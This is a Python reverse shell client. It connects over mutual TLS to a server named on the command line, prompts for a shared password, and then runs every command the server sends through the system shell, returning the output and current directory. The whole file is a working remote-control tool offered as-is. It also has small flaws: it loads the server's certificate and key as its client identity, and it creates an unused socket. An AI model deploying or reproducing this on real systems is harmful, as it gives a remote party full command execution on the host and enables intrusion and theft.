#!/usr/bin/env python3
"""
Secure Reverse Shell Client
- Uses mutual TLS (presents client cert).
- Prompts the user for the shared password when connecting.
"""
import sys
import socket
import ssl
import argparse
import getpass
import os
import subprocess

def create_client_context(ca_file, cert_file, key_file):
    """
    Client-side TLS context:
    - Purpose.SERVER_AUTH validates the server cert.
    - cafile ensures we only trust certs signed by our CA.
    - load_cert_chain presents our client cert & key.
    """
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=ca_file) 
    ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)               
    return ctx

def authenticate(sock):
    """
    Perform password-based authentication with the server
    """
    try:
        # Get password from user (won't display as they type)
        password = getpass.getpass("Enter password: ")
        
        # Send the password to the server
        sock.send(password.encode('utf-8'))
        
        # Get authentication result
        result = sock.recv(1024).decode('utf-8')
        if result == "AUTH_SUCCESS":
            print("Authentication successful")
            return True
        else:
            print("Authentication failed")
            return False
    except Exception as e:
        print(f"Authentication error: {e}")
        return False


def main():
    p = argparse.ArgumentParser(description="Secure Reverse Shell Client")
    p.add_argument('--server', required=True, help='Server hostname or IP')
    p.add_argument('--port', type=int, required=True, help='Server port')
    args = p.parse_args()

    ca = 'certs/ca.crt'
    cert = 'certs/server.crt'
    key = 'certs/server.key'

    context = create_client_context(ca, cert, key)


    # Create a socket and try to connect to the server
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock = context.wrap_socket(raw_sock, server_hostname=args.server)
        sock.connect((args.server, args.port))
    except socket.error as e:
        sys.exit(f"Connection failed: {e}")


    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f"[+] Connected to {args.server}:{args.port} over TLS")

    # Receive prompt and send password
     # Authenticate with the server
    if not authenticate(sock):
        sock.close()
        sys.exit(1)

    # Loop to receive and execute commands
    while True:
        try:
            data = sock.recv(1024)  # Wait for data
            if not data:
                break
            
            command = data.decode("utf-8", errors="ignore")  # decode command string
            
            # Special handling for "cd" command
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    output = ""
                except OSError as e:
                    output = f"An error changing directory: {e}"
            else:
                # Run the command with subprocess
                process = subprocess.Popen(
                    command, 
                    shell=True, 
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = process.communicate()
                output = stdout.decode() + stderr.decode()  # Combine output

            # Append the current directory path like a shell prompt
            cwd = os.getcwd() + ">"
            final_output = output + cwd

            # Send result to the server
            sock.send(final_output.encode("utf-8"))

        except Exception as e:
            sock.send(f"Error: {e}\n".encode("utf-8"))  # Send back any exception
            break
            
    sock.close()  # Close socket connection

# Entry point
if __name__ == '__main__':
    main()
